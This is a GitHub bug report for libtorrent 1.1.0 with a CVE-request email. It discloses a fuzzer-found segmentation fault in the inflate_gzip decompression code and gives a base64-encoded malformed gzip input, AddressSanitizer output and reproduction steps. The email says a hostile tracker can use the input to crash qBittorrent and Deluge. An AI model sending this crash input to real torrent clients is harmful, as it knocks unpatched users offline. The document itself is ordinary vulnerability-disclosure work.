# "Segmentation fault" (possible DoS) when parsing compressed data with function "inflate\_gzip" #1021

## Description

[![@sz3n](https://avatars.githubusercontent.com/u/6026202?v=4&size=48)](/sz3n)[sz3n](https://github.com/sz3n)opened [on Aug 21, 2016](https://github.com/arvidn/libtorrent/issues/1021#issue-172319841)

libtorrent version (or branch): 1.1.0.0

platform/architecture: Ubuntu 14.04LTS x86\_64

compiler and compiler version: gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3)

The issue was found with "afl fuzzer" while executing a modified version of the "test\_gzip" testsuite with the following input data(displayed in base64 format):

```
H4sIAAjjYGJiWXWAAAAAYFlZWVlZWV34+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4+Pj4AP4I

WVlZWVlZAID//1lZWVlZWVkA+ggMCAvLmQxZBf9iYgD/BQBZWVlZWVlZWVkAgP//YmJiEARkQPZZ
WVlZWQwMDIsIAEQ=

```

A segmentation fault signal was captured while running:

`./test_gzip gzip_data`

The output from ASAN:

```
ASAN:SIGSEGV
=================================================================
==28954==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00000048cb19 sp 0x7ffe24a458b0 bp 0x000000000000 T0)

SUMMARY: AddressSanitizer: SEGV /home/user/libtorrent-rasterbar-1.1.0/src/puff.cpp:365 construct(huffman*, short*, int)
==28954==ABORTING

```

The issue seems to be located in the puff.cpp file inside the "construct" function.

To reproduce:

1.compile "test\_gzip.cpp" (here attached)

2.copy the base64 encoded data to a file (ex. gzip\_data.b64)

3.decode the file to a new file ("base64 -d gzip\_data.b64 > gzip\_data")

3.run ./test\_gzip gzip\_data

[test\_gzip.cpp.txt](https://github.com/arvidn/libtorrent/files/428833/test_gzip.cpp.txt)

Subject: CVE Request : Libtorrent 1.1.0 inflate_gzip denial of service

Hi list,

I recently opened a bug on "Libtorrent 1.1.0" regarding malformed GZIP
encoded responses that causes  denial of service.

For example, an attacker-controlled torrent tracker can crash victim torrent
clients by sending malformed GZIP responses.

This bug has been fixed by the maintainer in master and the branch RC_1_1:

<https://github.com/arvidn/libtorrent/issues/1021>

<https://github.com/arvidn/libtorrent/pull/1022>

I also tested the bug with two "Libtorrent based" softwares :
qBittorrent and Deluge. Both of them were affected and crashed on
receiving the malformed response.
